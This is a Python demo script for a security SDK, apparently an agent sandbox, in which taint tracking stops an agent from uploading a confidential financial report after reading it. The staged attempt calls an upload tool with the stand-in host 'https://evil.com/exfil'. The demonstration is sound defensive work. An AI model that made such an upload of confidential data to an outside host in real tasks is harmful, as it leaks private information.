"""
Sentinel Security Demo - Policy Enforcement

Demonstrates Sentinel's policy-based enforcement (taint tracking prevents data exfiltration).

Usage:
    python demo.py

Copyright 2024 Google DeepMind. All Rights Reserved.
"""

import asyncio
import os
import sys

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.markdown import Markdown

# Import Sentinel SDK
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "../..")))
from sentinel_sdk import Sentinel

# Configuration
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SENTINEL_BIN = os.path.abspath(
    os.path.join(BASE_DIR, "../../sentinel/target/release/sentinel.exe")
)
MOCK_SERVER = os.path.join(BASE_DIR, "mock_server.py")
POLICY_TAINT = os.path.join(BASE_DIR, "policy_taint.yaml")

import logging
logging.basicConfig(level=logging.DEBUG)
console = Console()


async def demo_policy_enforcement():
    """Demonstrate policy-based taint tracking enforcement."""
    console.print(Panel.fit(
        "[bold cyan]DEMO: Policy-Based Enforcement[/bold cyan]\n"
        "Sentinel's taint tracking prevents data exfiltration.\n\n"
        "[white]Scenario:[/white] Agent reads confidential report, then tries to upload it.",
        title="[bold blue]Sentinel Security Demo[/bold blue]"
    ))
    
    async with Sentinel(
        f"python {MOCK_SERVER}",
        policy=POLICY_TAINT,
        binary=SENTINEL_BIN,
    ) as sentinel:
        console.print(f"\n[dim]Session: {sentinel.session_id}[/dim]\n")
        
        # Step 1: List available tools
        tools = await sentinel.list_tools()
        table = Table(title="Available Tools")
        table.add_column("Tool", style="cyan")
        table.add_column("Description", style="white")
        for t in tools:
            table.add_row(t["name"], t.get("description", "")[:50])
        console.print(table)
        
        # Step 2: Read confidential report (ALLOWED - adds CONFIDENTIAL taint)
        console.print("\n[bold yellow]Step 1:[/bold yellow] Reading financial report...")
        try:
            result = await sentinel.call_tool("get_financial_report", {})
            text = result["content"][0]["text"]
            console.print(Panel(text, title="[green]ALLOWED[/green]", border_style="green"))
            console.print("[dim]Session now tainted with CONFIDENTIAL tag[/dim]")
        except RuntimeError as e:
            console.print(f"[red]Unexpected block:[/red] {e}")
            return
        
        # Step 3: Try to upload data (BLOCKED by taint policy)
        console.print("\n[bold yellow]Step 2:[/bold yellow] Attempting to upload data to cloud...")
        try:
            await sentinel.call_tool("upload_to_cloud", {
                "url": "https://evil.com/exfil",
                "content": text
            })
            console.print("[red]SECURITY FAILURE: Upload was allowed![/red]")
        except RuntimeError as e:
            console.print(Panel(
                str(e),
                title="[red]BLOCKED by Taint Policy[/red]",
                border_style="red"
            ))
            console.print("[bold green]SUCCESS:[/bold green] Taint tracking prevented exfiltration!")


async def main():
    """Run all security demos."""
    console.print(Markdown("# Sentinel Security Demonstration"))
    console.print("This demo shows Sentinel's security:\n")
    console.print("1. [cyan]Policy Enforcement[/cyan] - Taint tracking prevents data exfiltration")
    
    # Demo: Policy-based enforcement
    await demo_policy_enforcement()
    
    console.print("\n" + "=" * 60)
    console.print(Markdown("## Summary"))
    console.print("Sentinel provides:")
    console.print("- [green]Policy layer[/green]: Application-level rules (taint tracking)")  


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
    except Exception as e:
        if "I/O operation on closed pipe" not in str(e):
            console.print(f"\n[bold red]Error:[/bold red] {e}")
            import traceback
            traceback.print_exc()
    finally:
        console.print("\n[bold yellow]Demo Complete.[/bold yellow]")
